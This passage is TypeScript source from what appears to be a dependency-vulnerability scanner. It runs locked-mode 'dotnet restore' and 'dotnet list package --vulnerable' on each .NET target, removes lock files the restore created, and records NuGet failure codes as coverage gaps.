 * findings away.
 *
 * A failed target is one coverage gap, not a whole-scan failure — the other
 * targets still run — and its reason carries NuGet's own code, so an
 * out-of-sync lock (`NU1004`) reads differently from a missing package
 * (`NU1101`) or an unreachable feed (`NU1301`).
 */
async function runDotnetSca(opts: {
  ctx: Parameters<NonNullable<Parameters<typeof makeScanTool>[0]['invoke']>>[1];
  reportDir: string;
  tools_run: ToolRun[];
  missing_tools: string[];
  parser_inputs: ScannerInvocation['parser_inputs'];
}): Promise<DotnetTargetFailure[]> {
  const { ctx, reportDir, tools_run, missing_tools, parser_inputs } = opts;
  const targets = findDotnetTargets(ctx.projectPath);
  if (targets.length === 0) return []; // no .sln/.csproj — nothing to do, not a gap

  const dotnetBin = await scannerAvailable('dotnet');
  if (!dotnetBin) {
    tools_run.push({ name: 'dotnet', status: 'skipped', reason: 'not_installed' });
    missing_tools.push('dotnet');
    return [];
  }

  let anyOk = false;
  const failures: DotnetTargetFailure[] = [];
  for (const [i, target] of targets.entries()) {
    const rel = relative(ctx.projectPath, target) || target;
    const plan = planDotnetRestore(ctx.projectPath, target);
    if (plan.blocked) {
      failures.push({ target: rel, code: plan.blocked.code, reason: plan.blocked.reason });
      continue;
    }
    const restore = await runProcess({
      command: 'dotnet',
      args: plan.args,
      cwd: ctx.projectPath,
      ...auditEnv(),
      signal: ctx.signal,
      onLog: ctx.onLog,
    });
    const created = removeCreatedLockFiles(plan);
    if (created.length > 0) {
      failures.push({
        target: rel,
        code: 'lock_file_would_be_created',
        reason:
          `restore created ${created.map((c) => relative(ctx.projectPath, c) || c).join(', ')} ` +
          '(a RestorePackagesWithLockFile opt-in this scan could not see) — deleted again; results not used',
      });
      continue;
    }
    if (restore.outcome !== 'completed') {
      // Never retried without --locked-mode: that retry would be exactly the
      // lock rewrite this whole sequence exists to prevent.
      const failure = classifyRestoreFailure(restore.stdout, restore.stderr);
      failures.push({ target: rel, code: failure.code, reason: failure.reason });
      continue;
    }

    const list = await runProcess({
      command: 'dotnet',
      args: ['list', target, 'package', '--vulnerable', '--include-transitive', '--format', 'json', '--no-restore'],
      cwd: ctx.projectPath,
      ...auditEnv(),
      signal: ctx.signal,
      onLog: ctx.onLog,
    });
    if (list.outcome !== 'completed' || list.stdout.trim().length === 0) {
      failures.push({ target: rel, code: 'list_failed', reason: 'restored, but `dotnet list package --vulnerable` failed' });
      continue;
    }
    anyOk = true;
    parser_inputs.push({ parser: dotnetScaParser, input: list.stdout });
    try {
      writeFileSync(join(reportDir, `dotnet-list-${i}.json`), list.stdout, 'utf8');
    } catch {
      /* best-effort evidence copy */
    }
  }

  const gapReason = failures.map((f) => `${f.target}: ${f.reason}`).join('; ');
  // The project's NuGet.config files answer the lookup: named (`runners/repoConfig.ts`).
  if (anyOk) {
    tools_run.push(
      await nameRepoConfig(
        {
          name: 'dotnet',
          status: 'ok',
          reason: failures.length > 0 ? `parsed into findings (gap — ${gapReason})` : 'parsed into findings',
        },
        ctx.projectPath,
        'dotnet',
      ),
    );
    if (failures.length > 0) missing_tools.push('dotnet');
  } else {
    tools_run.push(
      await nameRepoConfig({ name: 'dotnet', status: 'failed', reason: gapReason || 'no target could be listed' }, ctx.projectPath, 'dotnet'),
    );
    missing_tools.push('dotnet');
  }
  return failures;
}
